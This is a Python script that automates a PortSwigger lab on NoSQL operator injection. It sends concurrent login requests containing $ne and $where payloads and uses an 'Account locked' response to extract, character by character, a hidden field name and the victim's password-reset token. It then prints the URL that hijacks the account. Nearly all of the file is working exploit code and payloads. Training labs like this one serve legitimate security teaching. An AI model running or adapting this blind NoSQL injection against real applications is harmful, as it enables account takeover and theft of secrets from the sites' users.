#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import string
import json
from typing import Any

from bs4 import BeautifulSoup


# Maximum number of concurrent condition checks
CONCURRENCY = 20

# Responses
TRUE_RESPONSE = "Account locked"

# Field indices known: 0=_id, 1=username, 2=password, 3=email
TARGET_INDEX = 4

# Charset used for both field name and value extraction
VALUE_CHARSET = string.ascii_letters + string.digits + "-_"


async def check_condition(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    expression: str,
) -> bool:
    """POST a login payload with $where expression; True if 'Account locked'."""
    payload = {
        "username": "carlos",
        "password": {"$ne": ""},
        "$where": expression,
    }
    headers = {
        "Cookie": f"session={session}",
        "Content-Type": "application/json",
    }
    try:
        async with client.post(url, headers=headers, data=json.dumps(payload), ssl=False) as res:
            text = await res.text()
            return TRUE_RESPONSE in text
    except aiohttp.ClientConnectorError:
        pass
    except aiohttp.ClientError as e:
        print(f"[-] Error checking expression '{expression}': {e}")
    return False


async def find_true(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    candidates: list[tuple[Any, str]],
) -> Any | None:
    """Run candidate (value, expression) pairs concurrently; return the value of the first true one."""
    semaphore = asyncio.Semaphore(CONCURRENCY)
    found = asyncio.Event()
    result = None

    async def check(candidate: tuple[Any, str]) -> None:
        nonlocal result
        value, expression = candidate
        if found.is_set():
            return
        async with semaphore:
            if await check_condition(client, url, session, expression):
                result = value
                found.set()

    await asyncio.gather(*(check(c) for c in candidates))
    return result


async def extract_name_at_index(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    index: int,
) -> str:
    """Extract the field name at Object.keys(this)[index]."""
    name = ""
    for pos in range(30):
        candidates = [
            (char, f"Object.keys(this)[{index}].match(/^{name}[{char}]/g)")
            for char in VALUE_CHARSET
        ]
        char = await find_true(client, url, session, candidates)
        if char is None:
            break
        name += char
        print(f"  [index {index}] position {pos}: '{char}' → {name}")
    return name


async def extract_value(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    field_name: str,
) -> str:
    """Extract the value of the given field."""
    value = ""
    for pos in range(50):
        candidates = [
            (char, f"this.{field_name}.match(/^{value}[{char}]/g)")
            for char in VALUE_CHARSET
        ]
        char = await find_true(client, url, session, candidates)
        if char is None:
            break
        value += char
        print(f"  [{field_name}] position {pos}: '{char}' → {value}")
    return value


async def trigger_password_reset(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
) -> bool:
    """Submit carlos's username to /forgot-password to generate the reset token."""
    headers = {"Cookie": f"session={session}"}
    try:
        async with client.get(url + "/forgot-password", headers=headers, ssl=False) as res:
            text = await res.text()
            soup = BeautifulSoup(text, "html.parser")
            csrf_input = soup.find("input", {"name": "csrf"})
            if not csrf_input or not csrf_input.get("value"):
                print("[-] Could not find CSRF token on /forgot-password")
                return False
            csrf = csrf_input["value"]

        data = {"csrf": csrf, "username": "carlos"}
        async with client.post(
            url + "/forgot-password", headers=headers, data=data, ssl=False
        ) as res:
            return res.status == 200
    except aiohttp.ClientError as e:
        print(f"[-] Error triggering password reset: {e}")
        return False


async def verify_field(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    field_name: str,
) -> bool:
    """Confirm the field name by checking the /forgot-password endpoint."""
    headers = {"Cookie": f"session={session}"}
    try:
        async with client.get(
            url + f"/forgot-password?{field_name}=test", headers=headers, ssl=False
        ) as res:
            text = await res.text()
            return "Invalid token" in text
    except aiohttp.ClientError:
        return False


async def main():
    parser = argparse.ArgumentParser(
        description="Solve Lab: Exploiting NoSQL operator injection to extract unknown fields"
    )
    parser.add_argument(
        "-u", "--url", type=str, required=True,
        help="URL of the PortSwigger lab (e.g. https://YOUR-LAB-ID.web-security-academy.net)",
    )
    parser.add_argument(
        "-s", "--session", type=str, required=True,
        help="Session cookie value",
    )

    args = parser.parse_args()
    url = args.url.rstrip("/")
    login_url = url + "/login"
    session = args.session.strip()

    async with aiohttp.ClientSession(trust_env=True) as client:
        # Step 0: Trigger password reset to generate the token field
        print("[*] Triggering password reset for carlos...")
        if not await trigger_password_reset(client, url, session):
            print("[-] Failed to trigger password reset. Exiting.")
            return
        print("[+] Password reset triggered — token field created.")

        # Step 1: Extract the unknown field name at index 4
        print(f"[*] Extracting field name at index {TARGET_INDEX}...")
        field_name = await extract_name_at_index(client, login_url, session, TARGET_INDEX)

        if not field_name:
            print(f"[-] Could not find a field at index {TARGET_INDEX}. Exiting.")
            return

        print(f"[+] Unknown field at index {TARGET_INDEX}: '{field_name}'")

        # Step 2: Verify the field name
        print(f"[*] Verifying field '{field_name}' via /forgot-password...")
        if await verify_field(client, url, session, field_name):
            print(f"[+] Field verified: {field_name}")
        else:
            print(f"[-] Verification failed for '{field_name}' — the name may be wrong.")

        # Step 3: Extract the token value
        print(f"[*] Extracting value of '{field_name}'...")
        token = await extract_value(client, login_url, session, field_name)

        if token:
            print(f"\n[+] Field: {field_name}")
            print(f"[+] Token: {token}")
            print(f"\n[*] Next: reset carlos's password via")
            print(f"    GET {url}/forgot-password?{field_name}={token}")
        else:
            print("[-] Failed to extract token value.")


if __name__ == "__main__":
    asyncio.run(main())
